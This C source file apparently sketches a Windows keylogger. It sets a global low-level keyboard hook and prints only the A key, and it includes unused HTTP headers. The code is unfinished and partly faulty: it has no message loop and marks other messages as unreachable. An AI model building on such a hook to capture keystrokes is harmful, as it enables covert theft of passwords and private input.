#include <stdio.h>
#include <windows.h>
#include <stdbool.h>
#include <http.h>
#include <winhttp.h>
#include <httprequest.h>


LRESULT LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {

        switch (wParam) {
            case WM_KEYDOWN: break;
            case WM_KEYUP: break;
            case WM_SYSKEYDOWN: break;
            case WM_SYSKEYUP: break;
            default: __builtin_unreachable();
        }

        KBDLLHOOKSTRUCT* KBDLL_ptr = (KBDLLHOOKSTRUCT*)lParam;

        switch (KBDLL_ptr->vkCode) {
            case 0x41: printf("a"); break;
            default: break;
        }





    }
    return CallNextHookEx(0, nCode, wParam, lParam);
}

int main(void) {
    int allThreads = 0;
    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, &LowLevelKeyboardProc, NULL, allThreads);
    if (hook == NULL) exit(EXIT_FAILURE);
    while (true) {}

    return 0;
}